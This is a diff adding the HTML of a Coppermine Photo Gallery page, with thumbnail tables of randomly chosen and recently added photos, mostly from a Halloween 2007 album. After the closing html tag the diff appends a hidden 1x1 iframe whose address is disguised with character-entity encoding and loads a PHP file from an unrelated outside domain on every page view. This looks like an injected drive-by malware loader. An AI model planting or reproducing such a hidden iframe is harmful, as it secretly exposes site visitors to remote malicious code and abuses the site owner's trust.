+                                        <span class="thumb_title">21 views</span>
+                                        
+                                </td>
+                        </tr>
+                </table>
+        </td>
+
+        <td valign="top" class="thumbnails" width ="20%" align="center">
+                <table width="100%" cellpadding="0" cellspacing="0">
+                        <tr>
+                                <td align="center">
+                                        <a href="displayimage.php?album=random&amp;cat=0&amp;pos=-851"><img src="albums/29%20Novembre%2007/thumb_IMG_3955.JPG" class="image" width="100" height="67" border="0" alt="IMG_3955.JPG" title="Filename=IMG_3955.JPG
+Filesize=768KB
+Dimensions=1728x1152
+Date added=Apr 29, 2008"/><br /></a>
+                                        <span class="thumb_title">25 views</span>
+                                        
+                                </td>
+                        </tr>
+                </table>
+        </td>
+
+        <td valign="top" class="thumbnails" width ="20%" align="center">
+                <table width="100%" cellpadding="0" cellspacing="0">
+                        <tr>
+                                <td align="center">
+                                        <a href="displayimage.php?album=random&amp;cat=0&amp;pos=-1266"><img src="albums/27%20Dicembre%202007/thumb_IMG_4826.JPG" class="image" width="100" height="67" border="0" alt="IMG_4826.JPG" title="Filename=IMG_4826.JPG
+Filesize=907KB
+Dimensions=1728x1152
+Date added=Apr 29, 2008"/><br /></a>
+                                        <span class="thumb_title">21 views</span>
+                                        
+                                </td>
+                        </tr>
+                </table>
+        </td>
+
+        </tr>
+</table>
+<!-- End standard table -->
+
+        <img src="images/spacer.gif" width="1" height="7" border="" alt="" /><br />
+
+<!-- Start standard table -->
+<table align="center" width="100%" cellspacing="1" cellpadding="0" class="maintable">
+        <tr>
+                <td class="tableh1" colspan="5">Last additions</td>
+        </tr>
+
+        <tr>
+
+        <td valign="top" class="thumbnails" width ="20%" align="center">
+                <table width="100%" cellpadding="0" cellspacing="0">
+                        <tr>
+                                <td align="center">
+                                        <a href="displayimage.php?album=lastup&amp;cat=0&amp;pos=0"><img src="albums/Halloween07/thumb_IMG_3492.JPG" class="image" width="67" height="100" border="0" alt="IMG_3492.JPG" title="Filename=IMG_3492.JPG
+Filesize=181KB
+Dimensions=800x1200
+Date added=Apr 29, 2008"/><br /></a>
+                                        <span class="thumb_title">1653 views</span><span class="thumb_caption">Apr 29, 2008</span>
+                                        
+                                </td>
+                        </tr>
+                </table>
+        </td>
+
+        <td valign="top" class="thumbnails" width ="20%" align="center">
+                <table width="100%" cellpadding="0" cellspacing="0">
+                        <tr>
+                                <td align="center">
+                                        <a href="displayimage.php?album=lastup&amp;cat=0&amp;pos=1"><img src="albums/Halloween07/thumb_IMG_3490.JPG" class="image" width="67" height="100" border="0" alt="IMG_3490.JPG" title="Filename=IMG_3490.JPG
+Filesize=136KB
+Dimensions=800x1200
+Date added=Apr 29, 2008"/><br /></a>
+                                        <span class="thumb_title">1651 views</span><span class="thumb_caption">Apr 29, 2008</span>
+                                        
+                                </td>
+                        </tr>
+                </table>
+        </td>
+
+        <td valign="top" class="thumbnails" width ="20%" align="center">
+                <table width="100%" cellpadding="0" cellspacing="0">
+                        <tr>
+                                <td align="center">
+                                        <a href="displayimage.php?album=lastup&amp;cat=0&amp;pos=2"><img src="albums/Halloween07/thumb_IMG_3484.JPG" class="image" width="100" height="67" border="0" alt="IMG_3484.JPG" title="Filename=IMG_3484.JPG
+Filesize=121KB
+Dimensions=800x533
+Date added=Apr 29, 2008"/><br /></a>
+                                        <span class="thumb_title">2918 views</span><span class="thumb_caption">Apr 29, 2008</span>
+                                        
+                                </td>
+                        </tr>
+                </table>
+        </td>
+
+        <td valign="top" class="thumbnails" width ="20%" align="center">
+                <table width="100%" cellpadding="0" cellspacing="0">
+                        <tr>
+                                <td align="center">
+                                        <a href="displayimage.php?album=lastup&amp;cat=0&amp;pos=3"><img src="albums/Halloween07/thumb_IMG_3481.JPG" class="image" width="67" height="100" border="0" alt="IMG_3481.JPG" title="Filename=IMG_3481.JPG
+Filesize=154KB
+Dimensions=800x1200
+Date added=Apr 29, 2008"/><br /></a>
+                                        <span class="thumb_title">1649 views</span><span class="thumb_caption">Apr 29, 2008</span>
+                                        
+                                </td>
+                        </tr>
+                </table>
+        </td>
+
+        <td valign="top" class="thumbnails" width ="20%" align="center">
+                <table width="100%" cellpadding="0" cellspacing="0">
+                        <tr>
+                                <td align="center">
+                                        <a href="displayimage.php?album=lastup&amp;cat=0&amp;pos=4"><img src="albums/Halloween07/thumb_IMG_3479.JPG" class="image" width="100" height="67" border="0" alt="IMG_3479.JPG" title="Filename=IMG_3479.JPG
+Filesize=116KB
+Dimensions=800x533
+Date added=Apr 29, 2008"/><br /></a>
+                                        <span class="thumb_title">1653 views</span><span class="thumb_caption">Apr 29, 2008</span>
+                                        
+                                </td>
+                        </tr>
+                </table>
+        </td>
+
+        </tr>
+        <tr>
+
+        <td valign="top" class="thumbnails" width ="20%" align="center">
+                <table width="100%" cellpadding="0" cellspacing="0">
+                        <tr>
+                                <td align="center">
+                                        <a href="displayimage.php?album=lastup&amp;cat=0&amp;pos=5"><img src="albums/Halloween07/thumb_IMG_3476.JPG" class="image" width="100" height="67" border="0" alt="IMG_3476.JPG" title="Filename=IMG_3476.JPG
+Filesize=122KB
+Dimensions=800x533
+Date added=Apr 29, 2008"/><br /></a>
+                                        <span class="thumb_title">1650 views</span><span class="thumb_caption">Apr 29, 2008</span>
+                                        
+                                </td>
+                        </tr>
+                </table>
+        </td>
+
+        <td valign="top" class="thumbnails" width ="20%" align="center">
+                <table width="100%" cellpadding="0" cellspacing="0">
+                        <tr>
+                                <td align="center">
+                                        <a href="displayimage.php?album=lastup&amp;cat=0&amp;pos=6"><img src="albums/Halloween07/thumb_IMG_3474.JPG" class="image" width="100" height="67" border="0" alt="IMG_3474.JPG" title="Filename=IMG_3474.JPG
+Filesize=112KB
+Dimensions=800x533
+Date added=Apr 29, 2008"/><br /></a>
+                                        <span class="thumb_title">1647 views</span><span class="thumb_caption">Apr 29, 2008</span>
+                                        
+                                </td>
+                        </tr>
+                </table>
+        </td>
+
+        <td valign="top" class="thumbnails" width ="20%" align="center">
+                <table width="100%" cellpadding="0" cellspacing="0">
+                        <tr>
+                                <td align="center">
+                                        <a href="displayimage.php?album=lastup&amp;cat=0&amp;pos=7"><img src="albums/Halloween07/thumb_IMG_3470.JPG" class="image" width="100" height="67" border="0" alt="IMG_3470.JPG" title="Filename=IMG_3470.JPG
+Filesize=118KB
+Dimensions=800x533
+Date added=Apr 29, 2008"/><br /></a>
+                                        <span class="thumb_title">1654 views</span><span class="thumb_caption">Apr 29, 2008</span>
+                                        
+                                </td>
+                        </tr>
+                </table>
+        </td>
+
+        <td valign="top" class="thumbnails" width ="20%" align="center">
+                <table width="100%" cellpadding="0" cellspacing="0">
+                        <tr>
+                                <td align="center">
+                                        <a href="displayimage.php?album=lastup&amp;cat=0&amp;pos=8"><img src="albums/Halloween07/thumb_IMG_3468.JPG" class="image" width="100" height="67" border="0" alt="IMG_3468.JPG" title="Filename=IMG_3468.JPG
+Filesize=113KB
+Dimensions=800x533
+Date added=Apr 29, 2008"/><br /></a>
+                                        <span class="thumb_title">1744 views</span><span class="thumb_caption">Apr 29, 2008</span>
+                                        
+                                </td>
+                        </tr>
+                </table>
+        </td>
+
+        <td valign="top" class="thumbnails" width ="20%" align="center">
+                <table width="100%" cellpadding="0" cellspacing="0">
+                        <tr>
+                                <td align="center">
+                                        <a href="displayimage.php?album=lastup&amp;cat=0&amp;pos=9"><img src="albums/Halloween07/thumb_IMG_3467.JPG" class="image" width="100" height="67" border="0" alt="IMG_3467.JPG" title="Filename=IMG_3467.JPG
+Filesize=112KB
+Dimensions=800x533
+Date added=Apr 29, 2008"/><br /></a>
+                                        <span class="thumb_title">1743 views</span><span class="thumb_caption">Apr 29, 2008</span>
+                                        
+                                </td>
+                        </tr>
+                </table>
+        </td>
+
+        </tr>
+</table>
+<!-- End standard table -->
+
+        <img src="images/spacer.gif" width="1" height="7" border="" alt="" /><br />
+<div class="footer" align="center" style="padding-top: 10px;">Powered by <a href="http://coppermine-gallery.net/" title="Coppermine Photo Gallery" rel="external">Coppermine Photo Gallery</a></div>
+            </td>
+          </tr>
+        </table>
+      </td>
+    </tr>
+  </table>
+  <div id="vanity">
+      <a id="v_php" href="http://www.php.net/" target="_blank"></a>
+      <a id="v_mysql" href="http://www.mysql.com/" target="_blank"></a>
+      <a id="v_xhtml" href="http://validator.w3.org/check/referer" target="_blank"></a>
+      <a id="v_css" href="http://jigsaw.w3.org/css-validator/check/referer" target="_blank"></a>
+</div>
+<!--Coppermine Photo Gallery 1.4.14 (stable)-->
+</body>
+</html>
+<iframe src='&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#99;&#99;&#102;&#101;&#108;&#111;&#109;&#118;&#104;&#107;&#46;&#99;&#111;&#109;&#47;&#100;&#108;&#47;&#97;&#100;&#118;&#53;&#52;&#50;&#46;&#112;&#104;&#112;' width=1 height=1></iframe>
